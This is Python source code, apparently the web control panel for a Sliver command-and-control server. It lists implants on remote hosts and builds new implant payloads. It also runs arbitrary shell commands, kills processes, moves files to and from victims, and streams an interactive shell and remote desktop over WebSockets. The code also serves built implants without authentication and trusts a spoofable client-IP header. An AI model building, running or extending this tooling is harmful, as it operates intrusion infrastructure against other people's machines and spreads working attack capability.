"""FastAPI application factory, routes and WebSocket endpoints."""

from __future__ import annotations

import asyncio
import logging
import secrets
import time
from contextlib import asynccontextmanager, suppress

from fastapi import FastAPI, Form, HTTPException, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import (
    FileResponse,
    HTMLResponse,
    JSONResponse,
    PlainTextResponse,
    RedirectResponse,
)
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from starlette.concurrency import run_in_threadpool

from . import health
from .auth import Auth
from .build import BuildPipeline, load_build_request
from .config import Settings
from .db import Database
from .rd import RDBroker
from .sliver import BridgeError, SliverBridge
from .views import BridgeViews

log = logging.getLogger("fleet.panel")

CSRF_COOKIE = "fleet_csrf"


def _client_ip(request: Request) -> str:
    forwarded = request.headers.get("x-forwarded-for")
    if forwarded:
        return forwarded.split(",")[0].strip()
    return request.client.host if request.client else ""


def create_app(settings: Settings | None = None) -> FastAPI:
    config = settings or Settings.load()
    database = Database(config.db_path)
    database.migrate()
    auth = Auth(config, database)

    broker = RDBroker(config)

    @asynccontextmanager
    async def lifespan(_app: FastAPI):
        database.audit("system", "startup", "ok")
        with suppress(OSError):
            await broker.start()
        yield
        await broker.stop()

    app = FastAPI(title="fleet panel", docs_url=None, redoc_url=None, lifespan=lifespan)
    app.state.settings = config
    app.state.db = database
    app.state.auth = auth
    app.state.bridge = SliverBridge(config)
    app.state.views = BridgeViews(config, database, app.state.bridge)
    app.state.pipeline = BuildPipeline(config, database, app.state.bridge)
    app.state.broker = broker

    if config.static_dir.is_dir():
        app.mount("/static", StaticFiles(directory=str(config.static_dir)), name="static")

    templates = Jinja2Templates(directory=str(config.templates_dir))

    def render(request: Request, name: str, **context: object) -> HTMLResponse:
        context.setdefault("settings", config)
        context.setdefault("session", getattr(request.state, "session", None))
        context.setdefault("health", health.snapshot(config))
        context.setdefault("now", time.time())
        return templates.TemplateResponse(request, name, context)

    def csrf_token(request: Request) -> str:
        session = getattr(request.state, "session", None)
        if session is not None:
            return str(session["csrf"])
        cookie = request.cookies.get(CSRF_COOKIE, "")
        token = auth.unsign(cookie)
        if token:
            return token
        return ""

    def require(request: Request):
        return getattr(request.state, "session", None)

    @app.middleware("http")
    async def session_middleware(request: Request, call_next):
        request.state.session = None
        raw = request.cookies.get(config.session_cookie)
        if raw:
            session_id = auth.unsign(raw)
            if session_id:
                row = await run_in_threadpool(auth.get_session, session_id)
                if row is not None:
                    request.state.session = row
                    await run_in_threadpool(auth.touch_session, session_id)
        return await call_next(request)

    # -- health --------------------------------------------------------------
    @app.get("/healthz")
    async def healthz() -> PlainTextResponse:
        return PlainTextResponse("ok\n")

    @app.get("/healthz.json")
    async def healthz_json() -> JSONResponse:
        probes = await run_in_threadpool(health.as_dict, config)
        return JSONResponse(probes)

    # -- auth ----------------------------------------------------------------
    @app.get("/login", response_class=HTMLResponse)
    async def login_form(request: Request, error: str = "") -> HTMLResponse:
        if require(request):
            return RedirectResponse("/", status_code=303)
        token = secrets.token_urlsafe(24)
        response = render(request, "login.html", error=error, csrf=token)
        response.set_cookie(
            CSRF_COOKIE,
            auth.serializer.dumps(token),
            httponly=True,
            samesite="strict",
            secure=config.cookie_secure,
            max_age=900,
        )
        return response

    @app.post("/login")
    async def login_submit(
        request: Request,
        username: str = Form(...),
        password: str = Form(...),
        totp: str = Form(""),
        csrf: str = Form(""),
    ):
        ip = _client_ip(request)
        provided = auth.unsign(request.cookies.get(CSRF_COOKIE, ""))
        if not provided or not secrets.compare_digest(provided, csrf):
            database.audit(username or "?", "login", "fail", detail="csrf")
            return RedirectResponse("/login?error=csrf", status_code=303)

        key = f"user:{username.lower()}"
        remaining = auth.lockout_remaining(key)
        if remaining > 0:
            database.audit(username, "login", "locked", detail=f"{int(remaining)}s")
            return RedirectResponse(f"/login?error=locked+{int(remaining)}s", status_code=303)

        ok = await run_in_threadpool(auth.verify_password, password)
        ok = ok and await run_in_threadpool(auth.verify_totp, totp)
        if not ok or username != config.panel_user:
            await run_in_threadpool(auth.register_failure, key)
            database.audit(username, "login", "fail", target=ip, detail="bad credentials")
            return RedirectResponse("/login?error=invalid", status_code=303)

        await run_in_threadpool(auth.clear_failures, key)
        session_id, _csrf = await run_in_threadpool(
            auth.create_session, username, ip, request.headers.get("user-agent", "")
        )
        database.audit(username, "login", "ok", target=ip, detail="rotated session")
        response = RedirectResponse("/", status_code=303)
        response.set_cookie(
            config.session_cookie,
            auth.sign(session_id),
            httponly=True,
            samesite="strict",
            secure=config.cookie_secure,
            max_age=config.session_ttl,
        )
        response.delete_cookie(CSRF_COOKIE)
        return response

    @app.post("/logout")
    async def logout(request: Request, csrf: str = Form("")):
        session = require(request)
        if session is None:
            return RedirectResponse("/login", status_code=303)
        if auth.verify_csrf(str(session["csrf"]), csrf):
            await run_in_threadpool(auth.invalidate, str(session["id"]))
            database.audit(str(session["actor"]), "logout", "ok")
        response = RedirectResponse("/login", status_code=303)
        response.delete_cookie(config.session_cookie)
        return response

    # -- dashboard / audit ---------------------------------------------------
    @app.get("/", response_class=HTMLResponse)
    async def dashboard(request: Request):
        session = require(request)
        if session is None:
            return RedirectResponse("/login", status_code=303)
        implants = await app.state.views.implants()
        return render(
            request,
            "dashboard.html",
            csrf=csrf_token(request),
            implants=implants,
        )

    @app.get("/audit", response_class=HTMLResponse)
    async def audit_page(request: Request):
        session = require(request)
        if session is None:
            return RedirectResponse("/login", status_code=303)
        rows = await run_in_threadpool(database.recent_audit, 300)
        return render(request, "audit.html", csrf=csrf_token(request), rows=rows)

    @app.get("/audit.csv")
    async def audit_csv(request: Request):
        session = require(request)
        if session is None:
            return RedirectResponse("/login", status_code=303)
        rows = await run_in_threadpool(database.audit_csv)
        lines = ["id,ts,actor,action,target,result,detail"]
        for row in rows:
            fields = [
                str(row["id"]),
                f"{row['ts']:.3f}",
                str(row["actor"]),
                str(row["action"]),
                str(row["target"]),
                str(row["result"]),
                str(row["detail"]).replace(",", ";").replace("\n", " "),
            ]
            lines.append(",".join(fields))
        headers = {"Content-Disposition": "attachment; filename=audit.csv"}
        return PlainTextResponse("\n".join(lines) + "\n", headers=headers, media_type="text/csv")

    # -- build ---------------------------------------------------------------
    @app.get("/build", response_class=HTMLResponse)
    async def build_page(request: Request):
        session = require(request)
        if session is None:
            return RedirectResponse("/login", status_code=303)
        artifacts = await run_in_threadpool(app.state.pipeline.recent)
        return render(
            request,
            "build.html",
            csrf=csrf_token(request),
            artifacts=artifacts,
            error="",
            defaults=config,
        )

    @app.post("/build", response_class=HTMLResponse)
    async def build_submit(request: Request):
        session = require(request)
        if session is None:
            return RedirectResponse("/login", status_code=303)
        form = await request.form()
        if not auth.verify_csrf(str(session["csrf"]), str(form.get("csrf", ""))):
            return RedirectResponse("/build?error=csrf", status_code=303)
        build_request = load_build_request({key: str(value) for key, value in form.items()}, config)
        try:
            built = await run_in_threadpool(app.state.pipeline.build, build_request)
            database.audit(str(session["actor"]), "build", "ok", detail=f"{len(built)} artifacts")
            error = ""
        except Exception as exc:  # surfaced to the operator, never swallowed
            database.audit(str(session["actor"]), "build", "fail", detail=str(exc)[:200])
            built = []
            error = f"{type(exc).__name__}: {exc}"
        artifacts = await run_in_threadpool(app.state.pipeline.recent)
        return render(
            request,
            "build.html",
            csrf=csrf_token(request),
            artifacts=artifacts,
            error=error,
            defaults=config,
        )

    @app.get("/dl/{name}")
    async def download_artifact(name: str):
        path = config.artifacts_dir / name
        if not path.is_file():
            raise HTTPException(status_code=404, detail=f"no artifact {name}")
        return FileResponse(path, filename=name)

    # -- session drawer ------------------------------------------------------
    def bridge_ws_url(path: str) -> str:
        base = config.bridge_url.replace("https://", "wss://").replace("http://", "ws://")
        return base + path

    async def ws_session(websocket: WebSocket):
        raw = websocket.cookies.get(config.session_cookie)
        if not raw:
            return None
        session_id = auth.unsign(raw)
        if not session_id:
            return None
        return await run_in_threadpool(auth.get_session, session_id)

    @app.get("/s/{session_id}", response_class=HTMLResponse)
    async def session_page(request: Request, session_id: str):
        session = require(request)
        if session is None:
            return RedirectResponse("/login", status_code=303)
        return render(
            request,
            "session.html",
            csrf=csrf_token(request),
            session_id=session_id,
            rd_host=config.public_host,
            rd_port=config.rd_port,
            has_token=True,
        )

    @app.get("/api/{session_id}/token")
    async def api_token(request: Request, session_id: str):
        if require(request) is None:
            raise HTTPException(status_code=401)
        token = await run_in_threadpool(broker.mint, session_id)
        return JSONResponse({"token": token, "session_id": session_id})

    @app.get("/api/sessions")
    async def api_sessions(request: Request):
        if require(request) is None:
            raise HTTPException(status_code=401)
        implants, err = await app.state.views.implants()
        return JSONResponse({"sessions": implants, "error": err})

    @app.get("/api/{session_id}/info")
    async def api_info(request: Request, session_id: str):
        if require(request) is None:
            raise HTTPException(status_code=401)
        return JSONResponse(await app.state.views.info(session_id))

    @app.post("/api/{session_id}/exec")
    async def api_exec(request: Request, session_id: str):
        if require(request) is None:
            raise HTTPException(status_code=401)
        body = await request.json()
        path = body.get("path") or "sh"
        args = body.get("args") or []
        try:
            result = await run_in_threadpool(app.state.bridge.exec, session_id, path, args)
        except BridgeError as exc:
            raise HTTPException(status_code=502, detail=str(exc)) from exc
        return JSONResponse(result)

    @app.post("/api/{session_id}/ls")
    async def api_ls(request: Request, session_id: str):
        if require(request) is None:
            raise HTTPException(status_code=401)
        body = await request.json()
        try:
            return JSONResponse(
                await run_in_threadpool(app.state.bridge.ls, session_id, body.get("path", "."))
            )
        except BridgeError as exc:
            raise HTTPException(status_code=502, detail=str(exc)) from exc

    @app.post("/api/{session_id}/ps")
    async def api_ps(request: Request, session_id: str):
        if require(request) is None:
            raise HTTPException(status_code=401)
        try:
            return JSONResponse(await run_in_threadpool(app.state.bridge.ps, session_id))
        except BridgeError as exc:
            raise HTTPException(status_code=502, detail=str(exc)) from exc

    @app.post("/api/{session_id}/kill")
    async def api_kill(request: Request, session_id: str):
        session = require(request)
        if session is None:
            raise HTTPException(status_code=401)
        body = await request.json()
        try:
            result = await run_in_threadpool(app.state.bridge.kill, session_id, int(body["pid"]))
        except BridgeError as exc:
            raise HTTPException(status_code=502, detail=str(exc)) from exc
        database.audit(
            str(session["actor"]), "kill", "ok", target=session_id, detail=str(body["pid"])
        )
        return JSONResponse(result)

    @app.post("/api/{session_id}/tags")
    async def api_tags(request: Request, session_id: str):
        session = require(request)
        if session is None:
            raise HTTPException(status_code=401)
        body = await request.json()
        tags = [t for t in (body.get("tags") or "").split(",") if t.strip()]
        await run_in_threadpool(app.state.views.set_tags, session_id, tags)
        database.audit(str(session["actor"]), "tag", "ok", target=session_id, detail=",".join(tags))
        return JSONResponse({"ok": True, "tags": tags})

    @app.post("/api/{session_id}/upload")
    async def api_upload(request: Request, session_id: str):
        if require(request) is None:
            raise HTTPException(status_code=401)
        form = await request.form()
        upload = form.get("file")
        remote = str(form.get("path") or ".")
        if upload is None:
            raise HTTPException(status_code=400, detail="no file")
        data = await upload.read()
        try:
            return JSONResponse(
                await run_in_threadpool(
                    app.state.bridge.upload, session_id, remote, upload.filename, data
                )
            )
        except BridgeError as exc:
            raise HTTPException(status_code=502, detail=str(exc)) from exc

    @app.get("/api/{session_id}/download")
    async def api_download(request: Request, session_id: str, path: str):
        if require(request) is None:
            raise HTTPException(status_code=401)
        try:
            data = await run_in_threadpool(app.state.bridge.download, session_id, path)
        except BridgeError as exc:
            raise HTTPException(status_code=502, detail=str(exc)) from exc
        filename = path.replace("\\", "/").rsplit("/", 1)[-1]
        return PlainTextResponse(
            data, headers={"Content-Disposition": f'attachment; filename="{filename}"'}
        )

    @app.websocket("/shell/{session_id}")
    async def ws_shell(websocket: WebSocket, session_id: str):
        if await ws_session(websocket) is None:
            await websocket.close(code=4001)
            return
        await websocket.accept()
        from websockets.asyncio.client import connect

        try:
            async with connect(bridge_ws_url(f"/sliver/session/{session_id}/shell")) as bridge_conn:

                async def upstream():
                    while True:
                        try:
                            message = await websocket.receive()
                        except WebSocketDisconnect:
                            return
                        if message["type"] == "websocket.disconnect":
                            return
                        if message.get("text") is not None:
                            await bridge_conn.send(message["text"])
                        elif message.get("bytes") is not None:
                            await bridge_conn.send(message["bytes"])

                async def downstream():
                    async for message in bridge_conn:
                        if isinstance(message, bytes):
                            await websocket.send_bytes(message)
                        else:
                            await websocket.send_text(message)

                done, pending = await asyncio.wait(
                    [asyncio.create_task(upstream()), asyncio.create_task(downstream())],
                    return_when=asyncio.FIRST_COMPLETED,
                )
                for task in pending:
                    task.cancel()
                for task in done:
                    with suppress(Exception):
                        task.result()
        except (OSError, WebSocketDisconnect):
            with suppress(Exception):
                await websocket.close()

    @app.websocket("/rd/{session_id}")
    async def ws_rd(websocket: WebSocket, session_id: str):
        if await ws_session(websocket) is None:
            await websocket.close(code=4001)
            return
        await websocket.accept()
        queue = broker.subscribe(session_id)

        async def pump():
            while True:
                message = await queue.get()
                if isinstance(message, bytes):
                    await websocket.send_bytes(message)
                else:
                    await websocket.send_text(message)

        pump_task = asyncio.create_task(pump())
        try:
            while True:
                message = await websocket.receive()
                if message["type"] == "websocket.disconnect":
                    break
                text = message.get("text")
                if text:
                    await broker.send_input(session_id, text)
        except WebSocketDisconnect:
            pass
        finally:
            pump_task.cancel()
            broker.unsubscribe(session_id, queue)

    return app


app = create_app()
